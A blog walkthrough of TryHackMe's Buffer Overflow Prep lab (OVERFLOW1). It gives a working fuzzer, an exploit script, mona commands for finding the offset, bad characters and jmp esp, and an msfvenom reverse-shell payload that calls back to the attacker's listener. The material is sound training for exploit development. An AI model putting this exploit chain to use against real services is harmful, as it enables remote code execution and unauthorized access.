---
title: Buffer Overflow Prep
date: 2023-03-31
categories: [hack, bof]
tags: [bof,ctf,tryhackme,hack,exploit,oscp]
---

This is one of THM's easy labs. Here we will take a practical look at how to Buffer Overflow and receive a shell. In the past, it had BOF at OSCP exam. But it still remains a great training for those who want to specialize more in the subject.

![banner](/assets/Bof1/banner.png)

# Overflow1

First we need to access the VM via RDP. Run the command given on the THM website. Right-click the oscp.exe and also as Immunity Debugger icon on the Desktop and choose "Run as administrator".

![oscp.exe](/assets/Bof1/run-as-adm.png)

When Immunity loads, click the open file icon, or choose File -> Open. Navigate to the vulnerable-apps folder on the admin user's desktop, and then the "oscp" folder. Select the "oscp" (oscp.exe) binary and click "Open".

The binary will open in a "paused" state, so click the red play icon or choose Debug -> Run. In a terminal window, the oscp.exe binary should be running, and tells us that it is listening on port 1337.

On your Kali box, connect to port 1337 on 10.10.120.48 using netcat:

`nc -nv 10.10.120.48 1337`

Type "HELP" and press Enter. Note that there are 10 different OVERFLOW commands numbered 1 - 10. Type "OVERFLOW1 test" and press enter. The response should be "OVERFLOW1 COMPLETE". Terminate the connection.

![nc](/assets/Bof1/nc1.png)

## Mona Configuration

The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:

`!mona config -set workingfolder c:\mona\%p`

![mona-config](/assets/Bof1/mona-config.png)

## Fuzzing
Create a file on your Kali box called fuzzer.py with the following contents:

```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.120.48"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

Run the fuzzer.py script using python:

![fuzzer](/assets/Bof1/fuzzer.png)

The fuzzer will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.

![immunity](/assets/Bof1/fuzzer2.png)

## Crash Replication & Controlling EIP

Create another file on your Kali box called exploit.py with the following contents:

```
import socket

ip = "10.10.120.48"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (change the -l value to this):

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000`

![pattern](/assets/Bof1/pattern-create.png)

Copy the output and place it into the payload variable of the exploit.py script.

![pattern2](/assets/Bof1/patter-pay.png)

On Windows, in Immunity Debugger, re-open the oscp.exe again using the same method as before, and click the red play icon to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications).

On Kali, run the modified exploit.py script: python3 exploit.py

![run](/assets/Bof1/send1.png)

The script should crash the oscp.exe server again.

![EIP](/assets/Bof1/eip.png)

This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:

`!mona findmsp -distance 2000`

![mona-distance](/assets/Bof1/mona-distance.png)

offset: 1978

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

![new-exp](/assets/Bof1/change-off-ret-pay.png)

Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

![BBBB](/assets/Bof1/eip-com-b.png)

## Finding Bad Characters

Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).

`!mona bytearray -b "\x00"`

![bad-chars](/assets/Bof1/mona-bad-chars.png)

I've pick the bad chars from [this site](https://github.com/cytopia/badchars).

Update your exploit.py script and set the payload variable to the string of bad chars the script generates.

![new-payload](/assets/Bof1/payload.png)

Restart oscp.exe in Immunity and run the modified exploit.py script again.

![Immunity-stack](/assets/Bof1/immunity-pay.png)

 Make a note of the address to which the ESP register points and use it in the following mona command:

`!mona compare -f C:\mona\oscp\bytearray.bin -a <address ESP>`

A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

![Mona-compairs](/assets/Bof1/mona-compair.png)

> 00 07 08 2e 2f a0 a1

Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.

The first badchar in the list should be the null byte (\x00 and \x07) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.

![ESP-follow-in-dump](/assets/Bof1/follow-in-dump.png)

From here on it is a matter of testing each one of them. The process is quite repetitive and I will only post the final result here:

> I removed 0x00, 0x07, 0x2e, 0xa0

## Finding a Jump Point

With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):

`!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"`

This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).

![Mona-jump](/assets/Bof1/mona-find-jump.png)

> 625011AF

Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

> \xaf\x11\x50\x62

![Address](/assets/Bof1/return-add.png)

## Generate Payload

Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):

`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=53 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py`

Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:

![Payload](/assets/Bof1/payload2.png)

## Prepend NOPs

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

`padding = "\x90" * 16`

![NOP](/assets/Bof1/nops.png)

## Exploit!

With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell.

Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn't change it).

Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!

![Exploit](/assets/Bof1/exploit.png)